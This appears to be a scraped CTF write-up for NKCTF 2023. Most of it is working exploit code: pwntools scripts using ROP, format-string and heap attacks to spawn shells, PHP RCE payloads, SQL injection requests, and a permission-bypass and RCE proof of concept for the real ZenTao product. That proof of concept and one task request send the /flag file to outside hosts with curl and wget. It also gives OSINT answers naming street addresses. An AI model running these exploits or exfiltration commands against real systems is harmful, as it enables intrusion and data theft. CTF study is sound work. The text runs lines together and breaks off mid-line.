+from pwn import *from ctypes import CDLLcontext(arch = 'amd64',os = 'linux',log_level = 'debug')elf = ELF('./ez_stack')DEBUG = 0if DEBUG: gdbOpen = 1 libc = ELF("/home/shoucheng/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so") ld = ELF("/home/shoucheng/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so") p = process(argv=[ld.path,elf.path], env={"LD_PRELOAD" : libc.path}) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') #p = process('./ez_stack')else: gdbOpen = 0 ip = 'node2.yuzhian.com.cn' port = 35211 p = remote(ip, port) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') def debug(info="b main"): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, "b *$rebase(0x)")
+pop_rdi = 0x0000000000401283pop_rsi = 0x0000000000401281 # pop rsi ; pop r15 ; retsyscall = 0x000000000040114ecsu1 = 0x000000000040127Acsu2 = 0x0000000000401260
+debug("b *0x00000000004011F6")payload = b'a'*0x18 + p64(pop_rsi) + p64(0x4040B0)*2 + p64(syscall)payload += p64(csu1) + p64(0) + p64(1) + p64(0x4040B0) + p64(0)*2 + p64(0x4040B8) + p64(csu2)p.sendafter("NKCTF!n", payload)sleep(1)
+payload = b'/bin/shx00' + p64(syscall) + b'a'*0x2bp.send(payload)p.interactive()
+
+4
+
+baby_rop
+
+#!usr/bin/env python #coding=utf-8
+from pwn import *from ctypes import CDLLcontext(arch = 'amd64',os = 'linux',log_level = 'debug')elf = ELF('./nkctf_message_boards')DEBUG = 0if DEBUG: gdbOpen = 1 clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') p = process('./nkctf_message_boards') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: gdbOpen = 0 ip = 'node2.yuzhian.com.cn' port = 34966 p = remote(ip, port) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def debug(info="b main"): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, "b *$rebase(0x)")
+
+debug("b *0x0000000000401340")ret = 0x000000000040101apop_rdi = 0x0000000000401413main = 0x00000000004010F0puts_plt = elf.plt['puts']puts_got = elf.got['puts']read_got = elf.got['read']
+format = b"%41$pn"p.sendafter(b"name: ", format)p.recvuntil(b'0x')canary = int(p.recv(16), 16)log.info(hex(canary))payload = p64(ret)*30 + p64(main) + p64(canary)p.sendafter(b"the NKCTF: n", payload)format = b"%22$pn"p.sendafter(b"name: ", format)p.recvuntil(b'0x')leak = int(p.recv(12), 16) - 0x1ed6a0sys = leak + libc.sym['system']binsh = leak + next(libc.search(b'/bin/sh'))log.info(hex(leak))payload = p64(ret)*28 + p64(pop_rdi) + p64(binsh) + p64(sys) + p64(canary)p.sendafter(b"the NKCTF: n", payload)
+p.interactive()
+
+5
+
+9961code
+
+#coding:
+utf-8
+from pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./pwn'elf=ELF(elfelf)context.arch=elf.archgdb_text='''b *$rebase(0x139b) '''
+if len(sys.argv)==1 : io=process(elfelf) gdb_open=1 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
+elif sys.argv[1]=='2' : io=process(elfelf) gdb_open=0 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
+else : io=remote('node2.yuzhian.com.cn',32697) gdb_open=0 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
+def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a)
+shell='''shl edi,12mov ax,10call:
+xor dx,0x9966syscallxchg edi,esixor eax,eaxmov edi,eaxjmp call'''
+
+pay=asm(shell)gdb_attach(io,gdb_text)pause()io.send(pay)sleep(1)shell='''mov rsp,0x9961c00'''
+pay='a'*0xe+asm(shell)pay+='x48x31xf6x56x48xbfx2fx62x69x6ex2fx2fx73x68x57x54x5fxb0x3bx99x0fx05'
+io.send(pay)
+#NKCTF{4b4e9ac2-8163-4e58-a14b-02c1cb7f7654}# libc_base=u64(io.recvuntil('x7f')[-6:]+'x00x00')-libc.sym['__malloc_hook']-88-0x10
+# libc.address=libc_base
+# bin_sh_addr=libc.search('/bin/shx00').next()
+# system_addr=libc.sym['system']# free_hook_addr=libc.sym['__free_hook']
+# success('libc_base:'+hex(libc_base))
+# success('heap_base:'+hex(heap_base))
+
+io.interactive()
+
+6
+
+baby_heap
+
+#!usr/bin/env python #coding=utf-8
+from pwn import *from ctypes import CDLLcontext(arch = 'amd64',os = 'linux',log_level = 'debug')elf = ELF('./pwn')DEBUG = 0if DEBUG: gdbOpen = 1 libc = ELF("/home/shoucheng/tools/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc-2.32.so") ld = ELF("/home/shoucheng/tools/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/ld-2.32.so") p = process(argv=[ld.path,elf.path], env={"LD_PRELOAD" : libc.path}) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') #p = process('./')else: gdbOpen = 0 ip = 'node2.yuzhian.com.cn' port = 30509 libc = ELF("./libc-2.32.so") p = remote(ip, port) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') def debug(info="b main"): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, "b *$rebase(0x)")
+
+def choose(choice): p.sendlineafter(b"Your choice: ", str(choice).encode('ascii'))
+
+def add(idx, size): choose(1) p.recvuntil(b"index: ") p.sendline(str(idx).encode('ascii')) p.recvuntil(b"Size: ") p.sendline(str(size).encode('ascii')) def edit(idx, content): choose(3) p.recvuntil(b"index: ") p.sendline(str(idx).encode('ascii')) p.recvuntil(b"content: ") p.send(content)
+
+def show(idx): choose(4) p.recvuntil(b"index: ") p.sendline(str(idx).encode('ascii'))
+
+def free(idx): choose(2) p.recvuntil(b"index: ") p.sendline(str(idx).encode('ascii'))
+
+for i in range(8): add(i, 0x100)add(8, 0x100)for i in range(8): free(i)for i in range(7): add(i, 0x100)add(7, 0xf0)edit(7, b'n')show(7)leak = u64(p.recv(6).ljust(8, b'x00')) - 0x1e3d0alog.info("libc_base==>0x%x" %leak)sys = leak + libc.sym['system']free_hook = leak + libc.sym['__free_hook']log.info("free_hook==>0x%x" %free_hook)show(6)key = u64(p.recv(5).ljust(8, b'x00'))log.info("key==>0x%x" %key)add(9, 0x78)add(10, 0x60)add(11, 0x60)add(12, 0x60)edit(9, b'a'*0x78 + b'xe1')free(12)free(11)free(10)add(10, 0xd0)edit(10, b'/bin/shx00' + b'a'*0x60 + p64(0x71) + p64(free_hook^key) + b'n')add(13, 0x60)add(14, 0x60)edit(14, p64(sys) + b'n')free(10)debug()p.interactive()
+
+7
+
+only_read
+
+#!usr/bin/env python #coding=utf-8
+from pwn import *from ctypes import CDLLcontext(arch = 'amd64',os = 'linux',log_level = 'debug')elf = ELF('./pwn')DEBUG = 0if DEBUG: gdbOpen = 1 clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') p = process('./pwn')else: gdbOpen = 0 ip = 'node2.yuzhian.com.cn' port = 39981 p = remote(ip, port) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def debug(info="b main"): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, "b *$rebase(0x)")
+debug("b *0x00000000004013E1")p.send(b'V2VsY29tZSB0byBOS0NURiE=')sleep(1)p.send(b'dGVsbCB5b3UgYSBzZWNyZXQ6')sleep(1)p.send(b'SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45')sleep(1)p.send(b'Y2FuIHlvdSBmaW5kIG1lPw==')
+read_plt = elf.plt['read']read_got = elf.got['read']pop_rdi = 0x0000000000401683pop_rsi = 0x0000000000401681csu1 = 0x000000000040167Acsu2 = 0x0000000000401660
+payload = b'a'*0x38 + p64(pop_rsi) + p64(0x404100)*2 + p64(read_plt)payload += p64(pop_rsi) + p64(read_got)*2 + p64(read_plt)payload += p64(csu1) + p64(0) + p64(1) + p64(1) + p64(read_got) + p64(0x3b) + p64(read_got) + p64(csu2)payload += p64(csu1) + p64(0) + p64(1) + p64(0x404100) + p64(0) + p64(0) + p64(read_got) + p64(csu2)p.send(payload)sleep(2)p.sendline(b'/bin/shx00')sleep(5)p.send(p8(0xd0))
+p.interactive()
+
+8
+
+ByteDance
+
+#!usr/bin/env python #coding=utf-8
+from pwn import *from ctypes import CDLLcontext(arch = 'amd64',os = 'linux', log_level = 'debug')elf = ELF('./pwn02')DEBUG = 0if DEBUG: gdbOpen = 1 libc = ELF("/home/shoucheng/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so") ld = ELF("/home/shoucheng/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so") p = process(argv=[ld.path,elf.path], env={"LD_PRELOAD" : libc.path}) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
+else: gdbOpen = 0 ip = 'node2.yuzhian.com.cn' port = 39089 libc = ELF("/home/shoucheng/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so") p = remote(ip, port) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') def debug(info="b main"): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, "b *$rebase(0x)")
+
+def choose(choice): p.sendlineafter(b"Choice:", str(choice).encode('ascii'))
+
+def add(size, content): choose(1) p.recvuntil(b"size:") p.sendline(str(size).encode('ascii')) p.recvuntil(b"content:") p.send(content)
+def show(idx): choose(2) p.recvuntil(b"index:") p.sendline(str(idx).encode('ascii'))
+
+def free(idx): choose(3) p.recvuntil(b"index: ") p.sendline(str(idx).encode('ascii'))
+
+#prepare 0x140 size unsorted binadd(0x37,b'x00'*0x37)#idx 0 0x40add(0x37,b'x01'*0x37)#idx 1 0x80add(0x37,b'x02'*0x37)#idx 2 0xc0add(0x37,b'x03'*0x37)#idx 3 0x100 add(0x37,b'x00'*0x37)#idx 4 0x140
+#prepare a chunkadd(0x37,b'x00'*0x37)#idx 5
+#prepare chunks between idx 5 and top_chunk.add(0x37,b'x06'*0x37)#idx 6add(0x37,b'x07'*0x37)#idx 7add(0x37,b'x06'*0x37)#idx 8add(0x37,b'x07'*0x37)#idx 9add(0x37,b'x06'*0x37)#idx 10
+#put chunk in fastbin for i in range(5): free(i)
+
+p.sendlineafter(b"Choice:", b'1'*0x500)add(0x28,b'x00'*0x28)
+#madd some chunk.add(0x37,b'x01'*0x37) #idx 1 0x030add(0x17,b'x02'*0x17) #idx 2 0x070add(0x37,b'x03'*0x37) #idx 3 0x090add(0x37,b'x00'*0x37) #idx 4 0x0d0add(0x17,b'x00'*0x17) #idx 11 0x110#put the chunk in fastbin to make overlapped chunk.free(5)free(1)
+p.sendlineafter(b"Choice:", b'1'*0x500)add(0x37,b'x01'*0x37) #idx 1 0x030show(2)p.recvuntil(b'Content: ')leak = u64(p.recv(6).ljust(8, b'x00')) - 0x3c4b78log.info("libc_base==>0x%x" %leak)sys = leak + libc.sym['system']_IO_list_all = leak + libc.sym['_IO_list_all']add(0x17,b'x00'*0x17)#idx 5 0x070 = idx 2add(0x17,b'x08'*0x17)#idx 12 0x090free(12)free(5)show(2)p.recvuntil(b'Content: ')heap_base = u64(p.recv(6).ljust(8, b'x00')) - 0x90log.info("heap_base==>0x%x" %heap_base)
+free(4)add(0x27,b'x00'*0x18+p64(0x41)+b'x00'*7) # must keep the fastbin size = 0x41fake_file = b'/bin/shx00'+p64(0x61) # fake_filefake_file += p64(0)+p64(_IO_list_all-0x10) #unsorted bin attackfake_file += p64(0)+p64(1) #bypass checkfake_file = fake_file.ljust(0x38,b'x00')add(0x38,fake_file)free(6)payload_1 = b'x00'*0x28 + p64(heap_base+0x1d0) # point to fake_vtablepayload_1 = payload_1.ljust(0x37,b'x00')add(0x37,payload_1)free(7)payload_2 = p64(0)*3 + p64(sys) # fake_vtablepayload_2 = payload_2.ljust(0x37,b'x00')add(0x37,payload_2)debug()
+p.sendlineafter(b"Choice:", b'1')p.sendlineafter(b"size:", str(0x20).encode('ascii'))
+p.interactive()
+
+06
+
+Blockchain
+
+1
+
+SignIn
+
+NKCTF{W3c0me_to_NKCTF2023}
+
+07
+
+SocialEngineering
+
+1
+
+两个人的夜晚
+
+NKCTF{天津市西青区中北镇万卉路3号NCC新城市中心}
+
+2
+
+Bridge
+
+NKCTF{海南省海口市龙华区世纪公园}
+
+3
+
+旅程的开始
+
+NKCTF{贵州省贵阳市南明区遵义路1号}
+
+4
+
+The other Bridge
+
+NKCTF{重庆市渝中区嘉陵江畔戴家巷崖壁步道}
+
+5
+
+Ferris_Wheel
+
+NKCTF{重庆市永川区兴龙湖CBD永川里奥特莱斯渝西之眼摩天轮}
+
+6
+
+狂飙
+
+NKCTF{广东省江门市蓬江区莲平路}
+
+EDI安全
+
+扫二维码｜关注我们
+
+一个专注渗透实战经验分享的公众号
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line">$_=(０/０)._;$_=$_[&#x27;&#x27;==&#x27;$&#x27;];$_++;$__=$_++;$__=$_++.$__;$_++;$_++;$_=&#x27;_&#x27;.$__.($_++).$_;$$_[__]($$_[_]);</span><br><span class="line">NKCTF=%24_%3D(%EF%BC%90%2F%EF%BC%90)._%3B%24_%3D%24_%5B&#x27;&#x27;%3D%3D&#x27;%24&#x27;%5D%3B%24_%2B%2B%3B%24__%3D%24_%2B%2B%3B%24__%3D%24_%2B%2B.%24__%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D&#x27;_&#x27;.%24__.(%24_%2B%2B).%24_%3B%24%24_%5B__%5D(%24%24_%5B_%5D)%3B&amp;__=shell_exec&amp;_=echo%20%60cat%20%2Fflag%60%3E%2Fvar%2Fwww%2Fhtml%2F3.txt</span><br><span class="line">get请求:a=s1502113478a&amp;b=s1885207154a&amp;e=114514.11&amp;NS[CTF.go=apost请求:c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;cmd=(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%03%01%08%00%00%06%0c%01%07&quot;^&quot;%60%60%7c%20%2f%60%60%60%60&quot;);</span><br><span class="line">&lt;?php</span><br><span class="line">class Welcome&#123; public $name; public $arg;&#125;</span><br><span class="line">function waf($string)&#123; if(preg_match(&#x27;/f|l|a|g|*|?/i&#x27;, $string))&#123; die(&quot;you are bad&quot;); &#125;&#125;class Happy&#123; public $shell; public $cmd;&#125;class Hell0&#123; public $func;&#125;</span><br><span class="line">$ha=new Happy();$ha-&gt;shell=&quot;urldecode&quot;;$ha-&gt;cmd=&#x27;system($_POST[1]);&#x27;;</span><br><span class="line">$he=new Hell0();$he-&gt;func=$ha;</span><br><span class="line">$w=new Welcome();$w-&gt;name=&quot;welcome_to_NKCTF&quot;;$w-&gt;arg=$he;</span><br><span class="line">echo urlencode(serialize($w));</span><br><span class="line">https://xz.aliyun.com/t/11798#toc-1</span><br><span class="line">https://github.com/webraybtl/zentaopms_poc</span><br><span class="line"># -*- coding: UTF-8 -*-# !/usr/bin/python</span><br><span class="line">&#x27;&#x27;&#x27;权限绕过+RCE POC 伪静态传参版禅道系统 影响版本 安全版本开源版 17.4以下的未知版本&lt;=version&lt;=18.0.beta1 18.0.beta2旗舰版 3.4以下的未知版本&lt;=version&lt;=4.0.beta1 4.0.beta2企业版 7.4以下的未知版本&lt;=version&lt;=8.0.beta1 8.0.beta2&#x27;&#x27;&#x27;import requests</span><br><span class="line">proxies = &#123; #&quot;http&quot;: &quot;127.0.0.1:</span><br><span class="line">8080&quot;, #&quot;https&quot;: &quot;127.0.0.1:</span><br><span class="line">8080&quot;,&#125;def check(url): # url=&quot;http://10.211.55.3:</span><br><span class="line">8008&quot; url1 = url+&#x27;/misc-captcha-user.html&#x27; # url1 = url+&#x27;/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&#x27;#非伪静态版本按照此格式传参 # url2 = url+&#x27;/index.php?m=block&amp;f=printBlock&amp;id=1&amp;module=my&#x27;#可判断验证绕过的链接 url3 = url + &#x27;repo-create.html&#x27; url4 = url + &#x27;repo-edit-10000-10000.html&#x27; headers=&#123; &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;, &quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.9&quot;, &quot;Cookie&quot;:&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;, &#125;</span><br><span class="line"> headers2 = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Cookie&quot;: &quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;, &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;, &quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;, &quot;Referer&quot;:</span><br><span class="line">url+&quot;/repo-edit-1-0.html&quot; &#125;</span><br><span class="line"> data1 = &#x27;product%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=&#x27; data2 = &#x27;SCM=Subversion&amp;client=`curl -F &quot;filename=@/flag&quot; http://9p9p2b.ceye.io`&#x27; # curl -F &quot;filename=@/home/test/file.tar.gz&quot; http://9p9p2b.ceye.io s=requests.session() try: req1 = s.get(url1,timeout=5,verify=False,headers=headers) req3 = s.post(url3,data=data1,timeout=5,verify=False,headers=headers2) req4 = s.post(url4,data=data2,timeout=5,verify=False,headers=headers2) print(req4.text) return True </span><br><span class="line">except Exception as e: print(e) return Falseif __name__ == &#x27;__main__&#x27;: print(check(&quot;http://d8ce6925-25ed-4fd2-ad80-241401adfff8.node.yuzhian.com.cn:</span><br><span class="line">8000/&quot;))</span><br><span class="line">参考：https://xz.aliyun.com/t/8056#toc-4 进行RCE</span><br><span class="line">参考B站视频：https://www.bilibili.com/video/BV1Yc411j7TP</span><br><span class="line">POST /service/app/account.php HTTP/1.1Host: 88ec9874-92ff-4388-be98-d25617ee0278.node2.yuzhian.com.cnUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36X-Requested-With: XMLHttpRequestAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=357da909bf07d9414ed4ed0fConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 125</span><br><span class="line">type=login&amp;username=admin&#x27;;UPDATE ADMINS set PASSWORD = &#x27;67f43efc5701784db1504e4993d7e393&#x27;;-- &amp;password=admin&amp;verifycode=mzxk</span><br><span class="line">POST /service/app/account.php HTTP/1.1Host: 88ec9874-92ff-4388-be98-d25617ee0278.node2.yuzhian.com.cnUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36X-Requested-With: XMLHttpRequestAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=59896924bf07d94164875decConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 56</span><br><span class="line">type=login&amp;username=admin&amp;password=admin&amp;verifycode=zjm6</span><br><span class="line">POST /service/app/tasks.php?type=save_shell HTTP/1.1Host: 88ec9874-92ff-4388-be98-d25617ee0278.node2.yuzhian.com.cnContent-Length: 111Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://10.9.57.100:</span><br><span class="line">9080Referer: http://10.9.57.100:</span><br><span class="line">9080/530BC3Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=59896924bf07d94164875decConnection: close</span><br><span class="line">task_id=&amp;title=test6&amp;exec_cycle=5&amp;week=1&amp;day=3&amp;hour=1&amp;minute=1&amp;shell=wget x.x.x.x:</span><br><span class="line">4041/`cat /flag|base64`</span><br><span class="line">POST /service/app/tasks.php?type=exec_task HTTP/1.1Host: 88ec9874-92ff-4388-be98-d25617ee0278.node2.yuzhian.com.cnContent-Length: 5Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://10.9.57.100:</span><br><span class="line">9080Referer: http://10.9.57.100:</span><br><span class="line">9080/530BC3Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=59896924bf07d94164875decConnection: close</span><br><span class="line">tid=8</span><br><span class="line">NKCTF&#123;23076c1f-15a3-4c80-9436-d5645845d7fd&#125;</span><br><span class="line">https://blog.csdn.net/zip471642048/article/details/121998766</span><br><span class="line">0x00000FF/rensenware_force: rensenWare forcing tool (github.com)</span><br><span class="line">NKCTF&#123;U_R_re411y_g00d_At_p14ying_t0h0u&#125;</span><br><span class="line">from PIL import Image</span><br><span class="line">def decode(im): width,height = im.size lst = [] for y in range(height): for x in range(width): red,green,blue = im.getpixel((x,y)) if(blue | green | red) == 0: break index = (green&lt;&lt;8) + blue lst.append(chr(index)) return &#x27;&#x27;.join(lst)</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line"> all_text = decode(Image.open(&quot;out.bmp&quot;,&quot;r&quot;)) with open (&quot;decode.text&quot;,&quot;w&quot;,encoding = &quot;utf-8&quot;) as f: f.write(all_text)</span><br><span class="line">https://spammimic.com/decode.shtml</span><br><span class="line">montage *.png -tile 30x6 -geometry +0+0 flag_tmp.pnggaps --image flag_tmp.png　 --size 125 --save#说明一下参数 30x6和125#-tile：设置每行每列的原始图片数量，30x6 表示拼图的宽30张 高6张，这个要结合gaps多尝试几种不同组合才能得到正确的尺寸。#--size: 这里每张图片为125像素</span><br><span class="line">with open(&quot;r.txt&quot;) as r: red=r.read()with open(&quot;g.txt&quot;) as g: green=g.read()with open(&quot;b.txt&quot;) as b: blue = b.read()str=&quot;&quot;for i in range(0,148): str+=red[i] str+=green[i] str+=blue[i]print(str)</span><br><span class="line">IBTyf9pgyR9pCERLR5NuOpiONSG1VZptmvUIgoQ/RTEpTZPVTW2a779plBFIvcN+AES-12</span><br><span class="line">NKCTF&#123;603fcdfc-652b-40e4-90cf-f27c2edc2d9f&#125;</span><br><span class="line">e=65537n = 114101396033690088275999670914803472451228154227614098210572767821433470213124900655723605426526569384342101959232900145334500170690603208327913698128445002527020347955300595384752458477749198178791196660625870659540794807018881780680683388008090434114437818447523471527878292741702348454486217652394664664641N = 